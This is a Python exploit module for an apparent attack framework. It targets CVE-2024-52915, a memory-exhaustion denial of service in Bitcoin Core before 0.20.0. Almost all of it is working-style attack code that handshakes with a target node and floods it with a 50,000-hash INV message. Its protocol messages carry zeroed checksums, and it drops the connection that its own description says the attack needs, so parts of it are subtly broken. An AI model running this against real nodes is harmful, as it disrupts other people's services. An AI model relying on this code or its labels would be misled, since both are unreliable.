"""CVE-2024-52915: Bitcoin Core INV Message Memory DoS

This vulnerability allows remote attackers to cause memory exhaustion on Bitcoin
Core nodes via large INV messages. Before 0.20.0, Bitcoin Core sent one GETHEADERS
response for each block hash in an INV message, leading to potential buffer blowup.

Reference: https://bitcoincore.org/en/2024/07/03/disclose-inv-buffer-blowup/
Reference: https://nvd.nist.gov/vuln/detail/CVE-2024-52915

Affected: Bitcoin Core < 0.20.0
Fixed In: Bitcoin Core 0.20.0 (June 3, 2020)
Severity: MEDIUM (7.5 CVSS)
"""

import asyncio
import random
import struct

from minesploit.framework import Exploit, ExploitMeta, ExploitResult


class CVE_2024_52915_INV_MEMORY_DOS(Exploit):
    meta = ExploitMeta(
        name="CVE-2024-52915: Bitcoin Core INV Memory DoS",
        cve="CVE-2024-52915",
        cvss_score=7.5,
        severity="MEDIUM",
        affected_versions="Bitcoin Core < 0.20.0",
        discovered_by="John Newbery",
        disclosure_date="2024-07-03",
        description=(
            "Bitcoin Core before 0.20.0 allows remote attackers to cause memory exhaustion "
            "via a large INV message containing many block hashes. The node responds with "
            "one GETHEADERS message per hash, leading to buffer blowup when the attacker "
            "refuses to receive the response data."
        ),
        references=[
            "https://bitcoincore.org/en/2024/07/03/disclose-inv-buffer-blowup/",
            "https://nvd.nist.gov/vuln/detail/CVE-2024-52915",
        ],
    )

    DEFAULT_INV_SIZE = 50000

    def __init__(self):
        super().__init__()

    def _create_version_message(self) -> bytes:
        magic = b"\xf9\xbe\xb4\xd9"
        command = b"version\x00\x00\x00\x00\x00"

        payload = struct.pack("<I", 70015)
        payload += b"\x00" * 8
        payload += struct.pack("<Q", 0)
        payload += b"\x00" * 10
        payload += struct.pack("<Q", 0)
        payload += b"\x00" * 8
        payload += b"\x00"
        payload += b"\x00" * 10
        payload += b"\x00" * 24

        checksum = b"\x00\x00\x00\x00"

        return magic + command + struct.pack("<I", len(payload)) + checksum + payload

    def _create_inv_message(self, num_hashes: int) -> bytes:
        magic = b"\xf9\xbe\xb4\xd9"
        command = b"inv\x00\x00\x00\x00\x00\x00"

        inventory = b""
        for _ in range(num_hashes):
            inventory += b"\x02\x00\x00\x00"
            inventory += random.getrandbits(256).to_bytes(32, "big")

        payload = struct.pack("<I", num_hashes) + inventory
        checksum = b"\x00\x00\x00\x00"

        return magic + command + struct.pack("<I", len(payload)) + checksum + payload

    async def check(self, target: str, port: int = 8333, **kwargs) -> ExploitResult:
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(target, port),
                timeout=10.0,
            )

            version_msg = self._create_version_message()
            writer.write(version_msg)
            await writer.drain()

            response = await asyncio.wait_for(reader.read(4096), timeout=10.0)

            if not response or len(response) < 24:
                writer.close()
                await writer.wait_closed()
                return ExploitResult(False, "No version response received")

            if b"version" not in response[:16]:
                writer.close()
                await writer.wait_closed()
                return ExploitResult(False, "Invalid Bitcoin protocol response")

            verack_msg = b"\xf9\xbe\xb4\xd9verack\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            writer.write(verack_msg)
            await writer.drain()

            await asyncio.wait_for(reader.read(4096), timeout=10.0)

            writer.close()
            await writer.wait_closed()

            return ExploitResult(
                True,
                "Bitcoin Core node detected. Version check required to determine vulnerability.",
                {"service": "bitcoind", "note": "Requires version detection for vuln check"},
            )

        except asyncio.TimeoutError:
            return ExploitResult(False, "Connection timed out")
        except ConnectionRefusedError:
            return ExploitResult(False, "Connection refused")
        except Exception as e:
            return ExploitResult(False, f"Error: {str(e)}")

    async def exploit(
        self,
        target: str,
        port: int = 8333,
        inv_size: int | None = None,
        **kwargs,
    ) -> ExploitResult:
        num_hashes = inv_size if inv_size is not None else self.DEFAULT_INV_SIZE

        if num_hashes < 1:
            return ExploitResult(False, "Invalid INV size specified")

        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(target, port),
                timeout=10.0,
            )

            version_msg = self._create_version_message()
            writer.write(version_msg)
            await writer.drain()

            await asyncio.wait_for(reader.read(4096), timeout=10.0)

            verack_msg = b"\xf9\xbe\xb4\xd9verack\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            writer.write(verack_msg)
            await writer.drain()

            await asyncio.wait_for(reader.read(4096), timeout=10.0)

            inv_msg = self._create_inv_message(num_hashes)
            writer.write(inv_msg)
            await writer.drain()

            writer.close()
            await writer.wait_closed()

            return ExploitResult(
                True,
                f"Large INV message with {num_hashes} hashes sent to {target}:{port}. "
                "The node may respond with getheaders messages causing memory pressure.",
                {
                    "sent": True,
                    "inv_count": num_hashes,
                    "note": "DoS requires sustained connection and memory pressure on victim",
                },
            )

        except Exception as e:
            return ExploitResult(False, f"Error during exploit: {str(e)}")

    async def verify(self, target: str, port: int = 8333, **kwargs) -> ExploitResult:
        return ExploitResult(
            True,
            "Verification requires monitoring target memory usage",
        )
